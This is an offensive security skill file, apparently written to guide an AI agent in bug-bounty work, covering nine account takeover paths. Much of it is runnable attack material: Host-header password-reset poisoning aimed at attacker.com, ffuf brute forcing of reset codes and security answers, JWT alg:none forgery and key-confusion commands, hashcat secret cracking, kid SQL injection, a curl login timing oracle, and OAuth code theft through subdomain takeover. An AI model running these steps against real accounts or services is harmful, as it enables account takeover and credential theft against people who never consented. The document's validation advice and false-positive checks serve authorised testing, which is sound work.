---
name: hunt-ato
description: "Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (forge token to another identity; crypto details → hunt-jwt-crypto), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical."
---
---

## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.

### Path 1: Password Reset Poisoning (Host-Header)
```bash
POST /forgot-password HTTP/1.1
Host: attacker.com                 # primary Host swap
# OR keep real Host and add one of:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

email=victimB@company.com
```
The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.

### Path 2: Reset Token in Referer / Open-Redirect Leak
```
GET /reset-password?token=ABC123
→ page loads third-party resource: <script src="https://analytics.com/t.js">
→ browser sends  Referer: https://target.com/reset-password?token=ABC123
→ token exfiltrated to every off-origin host the page calls
```
Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.

### Path 3: Predictable / Weak Reset Tokens
```bash
# 6-digit numeric OTP-style reset code, no rate limit:
ffuf -u "https://target.com/api/reset/verify" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
```
**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.

#### Check the code's LENGTH before you check the rate limit

A missing rate limit on a code check looks like a brute-force primitive
and usually is not. The input's `maxlength` decides whether the rate
limit matters at all:

- `maxlength=6` with a numeric-looking field → a 6-digit PIN. The
  space is 1e6. An unthrottled check is a real takeover primitive.
- `maxlength=45` on a field labelled "enter the code we emailed you"
  → a long token. The space is astronomical. A missing rate limit on
  it is "rate limit on a non-critical form" — on the never-submit list.

So: read the field's `maxlength` and the surrounding copy FIRST. Only
then decide whether the rate limit is the finding.

#### A code check has three enumeration channels; close all three

1. **Body** — every code shape must return a byte-identical response.
   A shape that gets a different message ("invalid format" vs "not
   found") is a format oracle and shrinks the space.
2. **Timing** — measure the POST latency per code shape, and measure
   the server's own baseline (a plain GET of the same page) in the
   same loop. If the medians span less than the baseline's own
   jitter, there is no timing oracle. A multi-second server response
   can hide a 50 ms oracle, so always subtract the baseline instead of
   comparing POSTs to each other.
3. **Status code** — a 200 for "not found" and a 400 for "malformed"
   is a shape oracle even when the bodies look alike.

Measure shape, not value: empty / 6 digits / 8 digits / non-numeric /
dashes / very long / `<script>` / a quote. A shape rejected with 403
is a working filter, not a finding.

### Path 4: Token No-Expiry / Reuse / Cross-Account
```
Expiry:  request token → wait 2h → still valid? = bug
Reuse:   use token once → use again → still valid? = bug
Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email HTTP/1.1
Cookie: session=ATTACKER_A_SESSION
{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
```
If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.

### Path 6: JWT Manipulation
```bash
# (a) alg:none — strip the signature, set header alg to none
python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"
# send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
#
# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
#
# (c) weak HMAC secret: crack offline
hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
#
# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
```
**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.

### Path 7: Password Change Without Step-Up + Login Oracle
```bash
# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
{"new_password":"Pwned#2026"}          # no "current_password" field
#
# (b) login oracle to find a valid password without an existing cookie — measure response delta:
for p in $(cat candidates.txt); do
  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
  printf '%s\t%s\n' "$t" "$p"
done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
```
A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).

### Path 8: Social-Recovery / Security-Question Abuse
```bash
# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
ffuf -u "https://target.com/account/recover/answer" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -mc 200 -fr "incorrect" -t 5
# also test: answers returned/echoed in /api/me or recovery page source (client-side check)
# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)
```
Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.

### Path 9: SSO Subdomain Takeover at OAuth redirect_uri
```bash
# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via hunt-subdomain:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
# (c) claim that host on the cloud provider, serve a callback that logs the ?code=
# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

### ATO Severity Gate
- **Critical** — zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change → reset.
- **High** — one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).
- **Medium** — requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).

## USER ENUMERATION: A MOVING BODY LENGTH IS NOT AN ORACLE

A login form that echoes the submitted username back into the page produces a
body length that moves with the username length. A verdict script will print
"DIFFERENT BODY LENGTHS - a real oracle" and be **wrong**, because the variation
is the REFLECTION, not a distinction between accounts that exist and accounts
that do not.

The discriminating experiment, which needs **no real account**:

```
the SAME username, five FRESH sessions     ->  the body length is CONSTANT
five DIFFERENT usernames, one session each  ->  the length moves with the username
```

If the length is stable for one username across sessions, the variation is the
reflection. Real enumeration needs the **message** or the **timing** to move.

What a real oracle looks like:

| Signal | Verdict |
|---|---|
| "Invalid username or password" for both, timing spread under ~0.1s | no oracle |
| a different message for a known account ("this account is locked") | oracle |
| a `Forgot Password?` link that appears only for a known account | oracle |
| a "did you mean" suggestion, or a masked email in the error | oracle |
| a timing gap of half a second or more between known and unknown | oracle |

**Build the differential WITHOUT guessing real usernames.** Compare a
well-formed unknown address against a malformed one, an empty one and an
overlong one, each on a fresh session. If all four produce the same message,
the same body length and the same timing, the class is closed for that realm —
and you have closed it without touching a single real account.

**A page that renders a registration link only when the account does NOT exist
is ALSO an oracle**, and it is the inverse of the usual one: it tells the
attacker which usernames are FREE. Look for the registration or "forgot
password" link in the failed-login response.

**The cookie flags are part of the enumeration story.** A login session cookie
without `Secure` or `HttpOnly` turns a login-oracle into a session-theft chain,
so read them on the same request:
`Set-Cookie: KC_RESTART=...; Secure; HttpOnly; SameSite=None`.

**The same reflection is often not an XSS either.** Keycloak escapes the
username fully (`&quot;` `&#39;` `&lt;` `&gt;` `&amp;`). Confirm with a real
browser and a positive control: a server-side grep for `onerror=` hits the
ESCAPED text inside the value attribute and reports a false positive.
- **Low** — attacker must be MitM, or only self-account impact.

---

## A DIFFERENTIAL TEST WITH A BROKEN CONTROL HAS NO VERDICT

If a replay of the recorded request itself fails - a 4xx, a login wall,
a timeout - then EVERY case failing the same way proves NOTHING, and
the honest output is "the test did not run", not "the server rejects
the malicious variant".

This is not hypothetical. A recorded Okta authorization request
replayed with a truncated `client_id` answered 400 for all nine
provider-id variants, including the recorded one, and the phase
concluded "the server does not honour an attacker-named provider id".
That conclusion was FALSE: the recorded `client_id` had been cut
short, so the control never ran. Once the corpus URL was replayed
WHOLE, it answered 200 and every variant rendered the same sign-in
page.

Two separate traps in the same test:
  - the auth-server id in the path (`/oauth2/<ASID>/v1/authorize`) is
    NOT the client id; using it as `client_id` makes Okta answer 400
    with the generic "Your request resulted in an error" page, which
    is the same page for a bad client id, a bad redirect_uri and a bad
    provider id alike,
  - recorded `state` values are ONE-TIME. Replaying a URL whose state
    was already consumed also yields the same generic 400.

So: replay the corpus URL VERBATIM, require it to answer 200, and only
then change ONE parameter. Change one thing at a time, and keep the
positive control in the output so the next reader can see it passed.

## AN OFF-TENANT HOST IS NOT A CREDENTIAL SINK

A detector that flags every URL outside the target host will flag
`www.w3.org/TR/html4/strict.dtd` - the XML DOCTYPE that EVERY Okta
error page carries - and report it as an "attacker-reachable
endpoint". It also flags `schemas.xmlsoap.org`, `purl.org`,
`openxmlformats.org` and `xmlns` URIs.

When a detector reports an off-tenant host, name what the host
actually IS before concluding anything. Filter static assets
(`js|css|png|jpg|svg|ico|woff|ttf|json|txt`) and public
specification namespaces, and only a URL that could plausibly RECEIVE
a credential - a login page, an assertion consumer, an arbitrary
host the attacker controls - counts.

The test that settles the class is not "did the response differ" but
"does the response name a host the attacker chose". A page that
differs only in LENGTH, where the delta equals the length of the
injected value, is REFLECTION, not SELECTION.

## Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.
